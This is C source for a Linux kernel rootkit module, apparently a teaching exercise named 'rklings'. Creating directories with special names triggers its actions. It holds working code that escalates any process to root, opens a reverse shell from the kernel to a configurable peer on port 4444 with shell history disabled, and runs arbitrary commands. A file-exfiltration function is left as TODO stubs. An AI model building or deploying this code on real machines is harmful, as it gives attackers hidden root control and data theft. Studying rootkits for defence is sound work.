// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/pid.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/uio.h>
#include <linux/workqueue.h>
#include <net/net_namespace.h>

#include "rklings_hook.h"

#define RK_CMD_MAX 256

/* ------------------------------------------------------------------ */
/* Shell slot: one concurrent shell session                            */
/* ------------------------------------------------------------------ */

struct rk_shell_slot {
	struct socket *sock;
	struct file *file;
	struct mutex lock;
	struct work_struct work;
	bool busy;
	char cmd[RK_CMD_MAX];
};

static struct rk_shell_slot interactive_slot;
static struct rk_shell_slot exec_slot;

static unsigned short shell_port = 4444;
module_param(shell_port, ushort, 0600);

static char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0400);

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

/* ------------------------------------------------------------------ */
/* Socket helpers                                                      */
/* ------------------------------------------------------------------ */

/* Create a TCP socket and connect to the configured peer. */
static struct socket *rk_connect(void)
{
	struct sockaddr_in peer = {
		.sin_family = AF_INET,
		.sin_port = htons(shell_port),
	};
	struct socket *sock;
	int error;

	peer.sin_addr.s_addr = in_aton(peer_addr_str);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &sock);
	if (error)
		return ERR_PTR(error);

	error = kernel_connect(sock, (struct sockaddr *)&peer,
			       sizeof(peer), 0);
	if (error) {
		sock_release(sock);
		return ERR_PTR(error);
	}

	return sock;
}

/* Send all bytes in buf, handling partial sends. */
static int rk_send_all(struct socket *sock, void *buf, size_t len)
{
	size_t offset = 0;

	while (offset < len) {
		struct msghdr msg = { };
		struct kvec vec = {
			.iov_base = buf + offset,
			.iov_len = len - offset,
		};
		ssize_t sent;

		sent = kernel_sendmsg(sock, &msg, &vec, 1, len - offset);
		if (sent < 0)
			return (int)sent;
		if (!sent)
			return -EPIPE;
		offset += sent;
	}

	return 0;
}

/* ------------------------------------------------------------------ */
/* Privilege escalation                                                */
/* ------------------------------------------------------------------ */

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

/* ------------------------------------------------------------------ */
/* File descriptor installation for call_usermodehelper                 */
/* ------------------------------------------------------------------ */

/* Install a file as a specific file descriptor number. */
static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

/* Init callback for call_usermodehelper: install socket as fd 0, 1, 2. */
static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell_slot *slot = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!slot->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(slot->file, fd);
		if (error)
			return error;
	}
	return 0;
}

/* ------------------------------------------------------------------ */
/* Shell slot operations                                               */
/* ------------------------------------------------------------------ */

static void rk_slot_init(struct rk_shell_slot *slot, work_func_t fn)
{
	mutex_init(&slot->lock);
	INIT_WORK(&slot->work, fn);
	slot->busy = false;
	slot->sock = NULL;
	slot->file = NULL;
	slot->cmd[0] = '\0';
}

/* Convert the slot socket into a file for fd installation. */
static int rk_slot_make_file(struct rk_shell_slot *slot)
{
	struct file *file;

	file = sock_alloc_file(slot->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	/* sock_alloc_file takes ownership of the socket. */
	slot->file = file;
	return 0;
}

/* Release the slot's file (which also releases the socket). */
static void rk_slot_cleanup(struct rk_shell_slot *slot)
{
	if (slot->file) {
		fput(slot->file);
		slot->file = NULL;
		/* sock_alloc_file took ownership, so sock is gone. */
		slot->sock = NULL;
	} else if (slot->sock) {
		sock_release(slot->sock);
		slot->sock = NULL;
	}
}

/* Work function for the interactive shell slot. */
static void rk_interactive_work(struct work_struct *work)
{
	struct rk_shell_slot *slot;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-i", NULL };
	struct socket *sock;
	int error;

	slot = container_of(work, struct rk_shell_slot, work);

	sock = rk_connect();
	if (IS_ERR(sock)) {
		error = PTR_ERR(sock);
		goto out;
	}
	slot->sock = sock;

	error = rk_slot_make_file(slot);
	if (error)
		goto out;

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, slot);
	if (!sub) {
		error = -ENOMEM;
		goto out;
	}

	/* Block until the shell process exits. */
	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_slot_cleanup(slot);
	mutex_lock(&slot->lock);
	slot->busy = false;
	mutex_unlock(&slot->lock);
}

/* Work function for the exec shell slot. */
static void rk_exec_work(struct work_struct *work)
{
	struct rk_shell_slot *slot;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	struct socket *sock;
	int error;

	slot = container_of(work, struct rk_shell_slot, work);

	/* Point argv[2] at the command stored in the slot. */
	argv[2] = slot->cmd;

	sock = rk_connect();
	if (IS_ERR(sock)) {
		error = PTR_ERR(sock);
		goto out;
	}
	slot->sock = sock;

	error = rk_slot_make_file(slot);
	if (error)
		goto out;

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, slot);
	if (!sub) {
		error = -ENOMEM;
		goto out;
	}

	/* Block until the command finishes. */
	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_slot_cleanup(slot);
	mutex_lock(&slot->lock);
	slot->busy = false;
	slot->cmd[0] = '\0';
	mutex_unlock(&slot->lock);
}

/* Try to start the interactive shell. */
static int rk_start_interactive(void)
{
	int error = 0;

	mutex_lock(&interactive_slot.lock);
	if (interactive_slot.busy) {
		error = -EBUSY;
		goto unlock;
	}
	interactive_slot.busy = true;
	schedule_work(&interactive_slot.work);

unlock:
	mutex_unlock(&interactive_slot.lock);
	return error;
}

/* Try to start an exec shell with the given command. */
static int rk_start_exec(const char *cmd)
{
	size_t len;
	int error = 0;

	if (!cmd || !*cmd)
		return -EINVAL;

	len = strlen(cmd);
	if (len >= RK_CMD_MAX)
		return -E2BIG;

	mutex_lock(&exec_slot.lock);
	if (exec_slot.busy) {
		error = -EBUSY;
		goto unlock;
	}
	exec_slot.busy = true;
	memcpy(exec_slot.cmd, cmd, len + 1);
	schedule_work(&exec_slot.work);

unlock:
	mutex_unlock(&exec_slot.lock);
	return error;
}

/* ------------------------------------------------------------------ */
/* File exfiltration                                                   */
/* ------------------------------------------------------------------ */

/* Read a file and send its contents over a socket in chunks. */
static int rk_download(struct socket *sock, const char *path)
{
	/* TODO: Open the file with filp_open */

	/* TODO: Allocate a page-sized read buffer */

	/* TODO: Loop: kernel_read a chunk, kernel_sendmsg it */

	/* TODO: Send 4-byte zero as end-of-transfer marker */

	/* TODO: Clean up: kfree buffer, filp_close file */

	return -ENOSYS;
}

/* Connect, download a file, disconnect. */
static int rk_do_download(const char *path)
{
	struct socket *sock;
	int error;

	sock = rk_connect();
	if (IS_ERR(sock))
		return PTR_ERR(sock);

	error = rk_download(sock, path);

	kernel_sock_shutdown(sock, SHUT_RDWR);
	sock_release(sock);

	return error;
}

/* ------------------------------------------------------------------ */
/* Command dispatcher                                                  */
/* ------------------------------------------------------------------ */

RK_ON_MKDIR(name) {
	/* Privilege escalation */
	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate();

	/* Interactive shell */
	if (strcmp(name, "rklings.shell") == 0)
		return rk_start_interactive();

	/* One-shot exec: rklings.exec.CMD */
	if (strncmp(name, "rklings.exec.", 13) == 0)
		return rk_start_exec(name + 13);

	/* File download: rklings.download.PATH */
	if (strncmp(name, "rklings.download.", 17) == 0) {
		const char *path = name + 17;
		if (!*path)
			return -EINVAL;
		return rk_do_download(path);
	}

	return -ENOENT;
}

/* ------------------------------------------------------------------ */
/* Module lifecycle                                                    */
/* ------------------------------------------------------------------ */

static void rk_slot_stop(struct rk_shell_slot *slot)
{
	mutex_lock(&slot->lock);
	if (slot->sock)
		kernel_sock_shutdown(slot->sock, SHUT_RDWR);
	mutex_unlock(&slot->lock);
	cancel_work_sync(&slot->work);
}

static int __init rk_init(void)
{
	rk_slot_init(&interactive_slot, rk_interactive_work);
	rk_slot_init(&exec_slot, rk_exec_work);
	return rk_hook_start();
}

static void __exit rk_exit(void)
{
	rk_hook_stop();
	rk_slot_stop(&interactive_slot);
	rk_slot_stop(&exec_slot);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings file exfiltration");
